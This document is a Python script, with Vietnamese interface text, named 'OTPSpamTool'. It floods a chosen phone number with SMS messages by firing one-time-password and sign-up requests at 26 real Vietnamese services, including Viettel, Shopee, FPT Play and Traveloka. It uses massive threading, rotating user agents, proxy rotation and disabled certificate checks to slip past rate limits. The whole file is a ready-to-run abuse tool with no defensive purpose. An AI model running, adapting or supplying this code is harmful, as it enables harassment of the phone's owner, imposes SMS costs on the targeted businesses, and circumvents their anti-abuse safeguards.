import requests
import time
from typing import Dict, List
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import os
import sys

MAX_THREADS = 9999999999999999999999
TIMEOUT = 15
RETRY_ATTEMPTS = 3

class OTPSpamTool:
    def __init__(self):
        self.last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng', 'Bùi', 'Đặng']
        self.first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy', 'Khôi', 'Anh', 'Trang', 'Huy']
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        ]
        
        self.proxies = []
        self.use_proxy = False
        self.current_proxy_idx = 0
        self.results = {"success": 0, "failed": 0, "by_api": {}}
        self.lock = threading.Lock()

    def validate_phone(self, msisdn: str) -> bool:
        return msisdn.startswith("0") and len(msisdn) == 10 and msisdn.isdigit()

    def get_random_ua(self) -> str:
        return random.choice(self.user_agents)

    def get_proxy(self) -> Dict:
        if not self.use_proxy or not self.proxies:
            return {}
        
        with self.lock:
            proxy = self.proxies[self.current_proxy_idx % len(self.proxies)]
            self.current_proxy_idx += 1
        
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

    def generate_name(self) -> str:
        return f"{random.choice(self.last_names)} {random.choice(self.first_names)}"

    def update_result(self, api_name: str, status: bool):
        with self.lock:
            if status:
                self.results["success"] += 1
            else:
                self.results["failed"] += 1
            
            if api_name not in self.results["by_api"]:
                self.results["by_api"][api_name] = {"success": 0, "failed": 0}
            
            if status:
                self.results["by_api"][api_name]["success"] += 1
            else:
                self.results["by_api"][api_name]["failed"] += 1

    def create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(
            total=RETRY_ATTEMPTS,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def send_request(self, session: requests.Session, url: str, method: str = "POST", api_name: str = "", **kwargs) -> bool:
        try:
            headers = kwargs.get("headers", {})
            headers["User-Agent"] = self.get_random_ua()
            headers["Accept"] = "application/json"
            headers["Accept-Language"] = "vi-VN,vi;q=0.9"
            
            proxies = self.get_proxy()
            
            if method == "POST":
                response = session.post(
                    url, 
                    headers=headers, 
                    timeout=TIMEOUT,
                    proxies=proxies,
                    verify=False,
                    **{k: v for k, v in kwargs.items() if k != "headers"}
                )
            else:
                response = session.get(
                    url, 
                    headers=headers, 
                    timeout=TIMEOUT,
                    proxies=proxies,
                    verify=False,
                    **{k: v for k, v in kwargs.items() if k != "headers"}
                )
            
            success = response.status_code in [200, 201, 202, 400, 422, 429]
            self.update_result(api_name, success)
            return success
        except Exception as e:
            self.update_result(api_name, False)
            return False

    
    def send_tv360(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://tv360.vn/public/v1/auth/get-otp-login",
            json={"msisdn": sdt},
            headers={"Content-Type": "application/json"},
            api_name="TV360"
        )

    def send_sapo(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.sapo.vn/fnb/sendotp",
            data={"phonenumber": sdt},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            api_name="SAPO"
        )

    def send_viettel(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://viettel.vn/api/getOTPLoginCommon",
            json={"phone": sdt, "typeCode": "DI_DONG", "type": "otp_login"},
            headers={"Content-Type": "application/json"},
            api_name="VIETTEL"
        )

    def send_medicare(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://medicare.vn/api/otp",
            json={"mobile": sdt, "mobile_country_prefix": "84"},
            headers={"Content-Type": "application/json"},
            api_name="MEDICARE"
        )

    def send_dienmayxanh(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            data={"phoneNumber": sdt, "isReSend": "false", "sendOTPType": "1"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            api_name="DIENMAYXANH"
        )

    def send_kingfoodmart(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.onelife.vn/v1/gateway/",
            json={
                "operationName": "SendOtp",
                "variables": {"input": {"phone": sdt, "captchaSignature": "test"}},
                "query": "mutation SendOtp($input: SendOtpInput!) { sendOtp(input: $input) { otpTrackingId } }"
            },
            headers={"Content-Type": "application/json"},
            api_name="KINGFOODMART"
        )

    def send_mocha(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
            params={"msisdn": sdt, "languageCode": "vi"},
            method="POST",
            api_name="MOCHA"
        )

    def send_fptplay(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp",
            json={"phone": sdt, "country_code": "VN", "client_id": "test"},
            headers={"Content-Type": "application/json"},
            api_name="FPTPLAY"
        )

    def send_vieon(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vieon.vn/backend/user/v2/register",
            params={"platform": "web", "ui": "012021"},
            json={"username": sdt, "country_code": "VN", "device_id": "test"},
            headers={"Content-Type": "application/json"},
            api_name="VIEON"
        )

    def send_ghn(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
            json={"phone": sdt, "type": "register"},
            headers={"Content-Type": "application/json"},
            api_name="GHN EXPRESS"
        )

    def send_lottemart(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp",
            json={"username": sdt, "case": "register"},
            headers={"Content-Type": "application/json"},
            api_name="LOTTEMART"
        )

    def send_shopee(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://shopee.vn/api/v4/otp/get_settings_v2",
            json={"operation": 8, "phone": sdt, "supported_channels": [1, 2, 3, 6, 0, 5]},
            headers={"Content-Type": "application/json"},
            api_name="SHOPEE"
        )

    def send_tgdd(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
            data={"phoneNumber": sdt, "isReSend": "false", "sendOTPType": "1"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            api_name="TGDD"
        )

    def send_fptshop(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
            json={"phoneNumber": sdt, "otpType": "0", "fromSys": "WEBKHICT"},
            headers={"Content-Type": "application/json"},
            api_name="FPTSHOP"
        )

    def send_winmart(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-crownx.winmart.vn/iam/api/v1/user/register",
            json={"firstName": "Nguyễn", "phoneNumber": sdt, "dobDate": "2000-02-05", "gender": "Male"},
            headers={"Content-Type": "application/json"},
            api_name="WINMART"
        )

    def send_lozi(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://mocha.lozi.vn/v1/invites/use-app",
            json={"countryCode": "84", "phoneNumber": sdt},
            headers={"Content-Type": "application/json"},
            api_name="LOZI"
        )

    def send_f88(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.f88.vn/growth/webf88vn/api/v1/Pawn",
            json={"FullName": self.generate_name(), "Phone": sdt, "DistrictCode": "024", "ProvinceCode": "02", "AssetType": "Car"},
            headers={"Content-Type": "application/json"},
            api_name="F88"
        )

    def send_longchau(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
            json={"phoneNumber": sdt, "otpType": 0, "fromSys": "WEBKHLC"},
            headers={"Content-Type": "application/json"},
            api_name="LONGCHAU"
        )

    def send_galaxyplay(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.glxplay.io/account/phone/checkPhoneOnly",
            params={"phone": sdt},
            method="POST",
            api_name="GALAXYPLAY"
        )

    def send_ahamove(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.ahamove.com/api/v3/public/user/login",
            json={"mobile": sdt, "country_code": "VN", "firebase_sms_auth": True},
            headers={"Content-Type": "application/json"},
            api_name="AHAMOVE"
        )

    def send_traveloka(self, session, sdt: str) -> bool:
        phone = f"+84{sdt[1:]}" if sdt.startswith("0") else sdt
        return self.send_request(
            session, "https://www.traveloka.com/api/v2/user/signup",
            json={"fields": [], "data": {"userLoginMethod": "PN", "username": phone}, "clientInterface": "desktop"},
            headers={"Content-Type": "application/json"},
            api_name="TRAVELOKA"
        )

    def send_batdongsan(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
            params={"phoneNumber": sdt},
            method="GET",
            api_name="BATDONGSAN"
        )

    def send_gumac(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://cms.gumac.vn/api/v1/customers/verify-phone-number",
            json={"phone": sdt},
            headers={"Content-Type": "application/json"},
            api_name="GUMAC"
        )

    def send_vayvnd(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vayvnd.vn/v2/users/password-reset",
            json={"login": sdt, "trackingId": "test"},
            headers={"Content-Type": "application/json"},
            api_name="VAYVND"
        )

    def send_futabus(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vato.vn/api/authenticate/request_code",
            json={"phoneNumber": sdt, "deviceId": "test", "use_for": "LOGIN"},
            headers={"Content-Type": "application/json"},
            api_name="FUTABUS"
        )

    def send_pico(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://auth.pico.vn/user/api/auth/login/request-otp",
            json={"phone": sdt},
            headers={"Content-Type": "application/json"},
            api_name="PICO"
        )

    def load_proxies(self, proxy_file: str) -> bool:
        if not os.path.exists(proxy_file):
            print(f"❌ File proxy không tồn tại: {proxy_file}")
            return False
        
        try:
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            
            if not self.proxies:
                print("❌ File proxy trống!")
                return False
            
            print(f"✅ Đã load {len(self.proxies)} proxy")
            return True
        except Exception as e:
            print(f"❌ Lỗi load proxy: {e}")
            return False

    def run_all_apis(self, sdt: str, session: requests.Session):
        """Chạy tất cả API"""
        apis = [
            self.send_tv360, self.send_sapo, self.send_viettel, self.send_medicare,
            self.send_dienmayxanh, self.send_kingfoodmart, self.send_mocha, self.send_fptplay,
            self.send_vieon, self.send_ghn, self.send_lottemart, self.send_shopee,
            self.send_tgdd, self.send_fptshop, self.send_winmart, self.send_lozi,
            self.send_f88, self.send_longchau, self.send_galaxyplay, self.send_ahamove,
            self.send_traveloka, self.send_batdongsan, self.send_gumac, self.send_vayvnd,
            self.send_futabus, self.send_pico
        ]
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(api, session, sdt): api.__name__ for api in apis}
            completed = 0
            
            for future in as_completed(futures):
                completed += 1
                try:
                    future.result()
                except Exception:
                    pass
                print(f"  [{completed}/{len(apis)}] Đã xử lý", end="\r")

    def print_summary(self):
        print("\n" + "=" * 70)
        print("📊 TÓM TẮT KẾT QUẢ")
        print("=" * 70)
        print(f"✅ Tổng thành công: {self.results['success']}")
        print(f"❌ Tổng thất bại: {self.results['failed']}")
        print(f"📈 Tỉ lệ thành công: {self.results['success'] / (self.results['success'] + self.results['failed']) * 100:.1f}%" if (self.results['success'] + self.results['failed']) > 0 else "0%")
        
        print("\n🏆 Top API thành công:")
        sorted_apis = sorted(self.results["by_api"].items(), key=lambda x: x[1]["success"], reverse=True)
        for api_name, stats in sorted_apis[:5]:
            total = stats["success"] + stats["failed"]
            rate = stats["success"] / total * 100 if total > 0 else 0
            print(f"  {api_name:20} - ✅{stats['success']:2}/{total:2} ({rate:5.1f}%)")

    def run(self):
        print("=" * 70)
        print("🔥spam sms")
        print("=" * 70)
        
        print("\n🌍 setup")
        print("1. ko dung proxy")
        print("2. dung prx")
        choice = input("\nChọn (1-2): ").strip()
        
        if choice == "2":
            proxy_file = input("Nhập đường dẫn file proxy (VD: proxies.txt): ").strip()
            if self.load_proxies(proxy_file):
                self.use_proxy = True
            else:
                print("⚠️  Tiếp tục không dùng proxy...")
                self.use_proxy = False
        
        while True:
            sdt = input("\n📱 Nhập số điện thoại (vd: 0918103224): ").strip()
            if self.validate_phone(sdt):
                break
            print("❌ Số điện thoại không hợp lệ")

        while True:
            try:
                num_requests = int(input("🔢 Nhập số lần gửi (mặc định: 1): ") or "1")
                if num_requests > 0:
                    break
            except ValueError:
                pass
        
        while True:
            try:
                delay = float(input("⏱️  Delay giữa các lần (giây, mặc định: 2): ") or "2")
                if delay >= 0:
                    break
            except ValueError:
                pass
        
        print("\n" + "=" * 70)
        print(f"🚀 Đang send f4ck {sdt}")
        if self.use_proxy:
            print(f"🌍 Dùng {len(self.proxies)} proxy")
        print("=" * 70)
        
        for i in range(num_requests):
            print(f"\n[{i+1}/{num_requests}] Gửi request...")
            self.results = {"success": 0, "failed": 0, "by_api": {}}
            
            session = self.create_session()
            self.run_all_apis(sdt, session)
            session.close()
            
            print(f"\n✅ Thành công: {self.results['success']}")
            print(f"❌ Thất bại: {self.results['failed']}")
            
            if i < num_requests - 1:
                for j in range(int(delay), 0, -1):
                    print(f"⏳ Chờ {j}s...", end="\r")
                    time.sleep(1)
        
        self.print_summary()

if __name__ == "__main__":
    tool = OTPSpamTool()
    tool.run()